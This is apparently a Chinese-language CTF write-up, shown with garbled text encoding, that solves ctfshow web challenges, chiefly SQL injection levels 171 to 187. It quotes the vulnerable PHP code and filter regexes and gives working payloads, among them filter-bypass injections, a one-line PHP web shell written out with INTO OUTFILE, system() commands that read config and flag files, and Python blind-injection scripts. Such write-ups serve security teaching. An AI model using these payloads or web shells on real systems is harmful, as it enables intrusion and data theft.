<p>ç„¶åä¿®æ”¹<code>UA</code>ä¸º<code>&lt;?php eval($_POST[1]);?&gt;</code>ï¼Œéšåè®¿é—®æ‰§è¡Œå‘½ä»¤å³å¯ï¼ˆä½¿ç”¨<code>phpinfo</code>å¯ä»¥å¸®åŠ©å®šä½ï¼‰</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POSTï¼š</span><br><span class="line">1=system(&#x27;tac ../flagaa.php&#x27;);phpinfo();</span><br></pre></td></tr></table></figure>

<h1 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢åé¢çš„å³å¯</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; or id = &#x27;</span><span class="number">26</span></span><br></pre></td></tr></table></figure>

<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>-&gt;username!==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è”åˆæŸ¥è¯¢å¹¶ä¸”<code>username</code>ä¸èƒ½æ˜¯<code>flag</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; UNION SELECT id,password from ctfshow_user2 where username = &#x27;</span>flag</span><br></pre></td></tr></table></figure>

<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user3 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ¢æˆ3åˆ—å³å¯</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; UNION SELECT id,2,password from ctfshow_user3 where username = &#x27;</span>flag</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥å¯¹åˆ—åå­—è¿›è¡Œ<code>hex</code>å¤„ç†ï¼ˆå…¶ä»–ç¼–ç ä¹Ÿå¯<code>to_base64</code>ï¼Œä¹Ÿå¯ä»¥æˆªæ–­<code>substr</code>æˆ–è€…é€†å‘<code>reverse</code>è¾“å‡ºï¼‰</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; UNION SELECT id,hex(username),password from ctfshow_user3 where username = &#x27;</span>flag</span><br></pre></td></tr></table></figure>

<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user4 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†<code>flag</code>å’Œæ•°å­—ï¼Œè€ƒè™‘æŠŠæ‰€æœ‰æ•°å­—æ›¿æ¢æ‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://41c95c0c-b709-4515-8f36-a3dc76110439.challenge.ctf.show/api/v4.php?id=&quot;</span></span><br><span class="line">a1=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line">a2=[<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;password&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	payload = <span class="string">&quot;replace(&quot;</span> + payload + <span class="string">&quot;,&#123;&#125;,&#x27;&#123;&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(a1[i], a2[i])</span><br><span class="line">payload = <span class="string">&quot;-1&#x27; union select &#x27;a&#x27;,&quot;</span> + payload + <span class="string">&quot; from ctfshow_user4 where username = &#x27;flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">response = requests.get(url=url+payload)</span><br><span class="line">res = re.findall(<span class="string">r&#x27;ctfshow&#123;.*?&#125;&#x27;</span>,response.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> res:</span><br><span class="line">	<span class="keyword">if</span> c <span class="keyword">in</span> a2:</span><br><span class="line">		flag += <span class="built_in">str</span>(a1[a2.index(c)])</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		flag += c</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user5 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†asciiç ä»1~127çš„å­—ç¬¦ï¼Œæµ‹è¯•å‘ç°ç”¨ä¸­æ–‡å­—ç¬¦ä¸è¡Œï¼Œå› ä¸ºè¿”å›çš„jsonæ ¼å¼ä»ä¼šè¢«æ£€æµ‹åˆ°ï¼Œæ•…é€‰æ‹©ç›´æ¥å†™å…¥ä¸€å¥è¯æœ¨ğŸ(æ³¨æ„åˆ—æ•°ï¼Œè¿™é‡Œæ˜¯2åˆ—)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &#x27;/var/www/html/1.php</span><br></pre></td></tr></table></figure>

<p>å»çœ‹æ•°æ®åº“é…ç½®å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/1.php</span><br><span class="line">POSTï¼š</span><br><span class="line">1=system(&#x27;cat ./api/config.php&#x27;);</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbhost</span> =<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpwd</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;ctfshow_web&quot;</span>;</span><br><span class="line"><span class="variable">$charName</span> = <span class="string">&quot;utf-8&quot;</span>; </span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥ï¼Œå³é”®é€‰æ‹©æ•°æ®æ“ä½œï¼Œé…ç½®å‚æ•°ï¼ˆæ•°æ®åº“ç±»å‹é€‰æ‹©<code>MYSQLI</code>ï¼‰ï¼Œè¿æ¥ååœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°<code>flag</code></p>
<p><img src="https://cdnjson.com/images/2023/02/08/web175.png" alt="web175.png"></p>
<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>åŸºæœ¬ä¸Šæ²¡è¿‡æ»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or id = &#x27;26</span><br><span class="line">-1&#x27; or username=&#x27;flag</span><br><span class="line">-1&#x27; or &#x27;1</span><br></pre></td></tr></table></figure>

<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>è¿‡æ»¤äº†ç©ºæ ¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/or/**/username=&#x27;flag</span><br><span class="line">-1&#x27;or`username`=&#x27;flag</span><br><span class="line">-1&#x27;or`id`=&#x27;26</span><br><span class="line">-1&#x27;union%0bselect/**/1,2,password/**/from/**/ctfshow_user%23</span><br></pre></td></tr></table></figure>

<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>åœ¨ä¸Šä¸€é¢˜åŸºç¡€ä¸Šè¿‡æ»¤äº†<code>/**/</code>(é™¤äº†ä¸‹è¿°<code>payload</code>ï¼Œä¹Ÿå¯ä»¥ç”¨%0aï¼Œ%09)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or`username`=&#x27;flag</span><br><span class="line">-1&#x27;or`id`=&#x27;26</span><br><span class="line">-1&#x27;union%0bselect%0b1,2,password%0bfrom%0bctfshow_user%23</span><br></pre></td></tr></table></figure>

<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p>åˆè¿‡æ»¤äº†%0aå’Œ%09</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or`id`=&#x27;26</span><br><span class="line">-1&#x27;or`username`=&#x27;flag</span><br><span class="line">-1&#x27;or`username`like&#x27;%fla%</span><br><span class="line">1&#x27;||1%23</span><br><span class="line">-1&#x27;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23</span><br></pre></td></tr></table></figure>

<h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>è¿‡æ»¤äº†æ³¨é‡Šç¬¦<code>#</code>å’Œ<code>--</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or`id`=&#x27;26</span><br><span class="line">-1&#x27;or`username`=&#x27;flag</span><br><span class="line">-1&#x27;or`username`like&#x27;%fla%</span><br><span class="line">-1&#x27;||username=&#x27;flag</span><br><span class="line">-1&#x27;union%0cselect%0c1,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere`username`=&#x27;flag&#x27;),&#x27;3</span><br></pre></td></tr></table></figure>

<h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>ç¦ç”¨äº†ä¸€äº›å­—ç¬¦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or`id`=&#x27;26</span><br><span class="line">-1&#x27;or`username`=&#x27;flag</span><br><span class="line">-1&#x27;or`username`like&#x27;%fla%</span><br><span class="line">-1&#x27;||username=&#x27;flag</span><br></pre></td></tr></table></figure>

<h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;      </span><br></pre></td></tr></table></figure>

<p>flagç»™è¿‡æ»¤äº†ï¼Œæ¨¡ç³ŠåŒ¹é…æˆ–è€…æ­£åˆ™å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or`username`like&#x27;%fla%</span><br><span class="line">-1&#x27;||(username)regexp&#x27;f</span><br><span class="line">-1&#x27;||(password)regexp&#x27;f</span><br></pre></td></tr></table></figure>

<h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(pass) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;      </span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢ç»“æœ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®è¿”å›çš„è®°å½•æ€»æ•°ç›²æ³¨å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">letters = string.ascii_letters + string.digits + <span class="string">&#x27;-&#125;&#123;_&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://799ce76f-af36-4e17-a4ef-deef39f0d322.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">stop = <span class="literal">False</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> stop <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> letters:</span><br><span class="line">		payload = flag + c</span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">&quot;tableName&quot;</span>:<span class="string">f&quot;(ctfshow_user)where(pass)like&#x27;%<span class="subst">&#123;payload&#125;</span>%&#x27;&quot;</span></span><br><span class="line">			<span class="comment"># ä¹Ÿå¯ä»¥ç”¨è¿™å‡ ç§payload</span></span><br><span class="line">			<span class="comment"># &quot;tableName&quot;:f&quot;`ctfshow_user`where`pass`like&#x27;%&#123;payload&#125;%&#x27;&quot;</span></span><br><span class="line">			<span class="comment"># &quot;tableName&quot;:f&#x27;(ctfshow_user)where(pass)regexp(&quot;^&#123;payload&#125;&quot;)&#x27;</span></span><br><span class="line">		&#125;</span><br><span class="line">		response = requests.post(url=url, data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;user_count = 1;&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">			<span class="keyword">if</span> c == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">				stop = <span class="literal">True</span></span><br><span class="line">			flag = payload</span><br><span class="line">			<span class="built_in">print</span>(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢ç»“æœ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>å¼•å·éƒ½è¢«ç¦ç”¨äº†ï¼Œä½†ç©ºæ ¼æ”¾å‡ºæ¥äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">letters = string.ascii_letters + string.digits + <span class="string">&#x27;-&#125;&#123;_&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://2e4133ff-13ae-4038-9b6e-ce069aa25427.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">stop = <span class="literal">False</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">hex_flag = <span class="string">&#x27;0x63746673686F777B&#x27;</span></span><br><span class="line"><span class="keyword">while</span> stop <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> letters:</span><br><span class="line">		payload = hex_flag + <span class="built_in">hex</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]</span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">&quot;tableName&quot;</span>:<span class="string">f&quot;ctfshow_user group by pass having pass regexp(<span class="subst">&#123;payload&#125;</span>)&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">		response = requests.post(url=url, data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;user_count = 1;&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">			<span class="keyword">if</span> c == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">				stop = <span class="literal">True</span></span><br><span class="line">			hex_flag = payload</span><br><span class="line">			flag += c</span><br><span class="line">			<span class="built_in">print</span>(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="web185-186"><a href="#web185-186" class="headerlink" title="web185-186"></a>web185-186</h2><p>ä¸èƒ½ç”¨æ•°å­—äº†ï¼Œè€ƒè™‘ç”¨<code>char</code>å’Œ<code>true</code>æ„é€ å‡ºå­—æ¯ï¼Œç„¶åç”¨<code>concat</code>æ‹¼æ¥èµ·æ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ‘è¿™é‡Œä½¿ç”¨äº†å¾ˆå¤šä¸ªtrueæ‹¼æ¥ï¼Œä½†å®é™…ä¸Šä¹Ÿå¯ä»¥ä¸€ä½ä¸€ä½çš„ï¼Œæ¯”å¦‚99å¯ä»¥ç”¨&#x27;9&#x27;å’Œ&#x27;9&#x27;æ‹¼èµ·æ¥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_convert</span>(<span class="params">s:<span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">  ss = <span class="string">&#x27;concat(&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">      ss += <span class="string">f&#x27;char(true&#x27;</span> + <span class="string">&#x27;+true&#x27;</span>*(<span class="built_in">ord</span>(c)-<span class="number">1</span>) + <span class="string">&#x27;),&#x27;</span></span><br><span class="line">  <span class="keyword">return</span> ss[:-<span class="number">1</span>]+<span class="string">&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">letters = string.ascii_letters + string.digits + <span class="string">&#x27;-&#125;&#123;_&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://532df19e-89ba-4a7a-8d31-6c7c7e5bea8e.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">stop = <span class="literal">False</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> stop <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">  <span class="keyword">for</span> c <span class="keyword">in</span> letters:</span><br><span class="line">      payload = str_convert(flag+c)</span><br><span class="line">      data = &#123;</span><br><span class="line">          <span class="string">&quot;tableName&quot;</span>:<span class="string">f&quot;ctfshow_user group by pass having pass regexp(<span class="subst">&#123;payload&#125;</span>)&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      response = requests.post(url=url, data=data)</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&#x27;user_count = 1;&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">          <span class="keyword">if</span> c == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">              stop = <span class="literal">True</span></span><br><span class="line">          flag += c</span><br><span class="line">          <span class="built_in">print</span>(flag)</span><br><span class="line">          <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = &#x27;<span class="subst">$username</span>&#x27; and password= &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
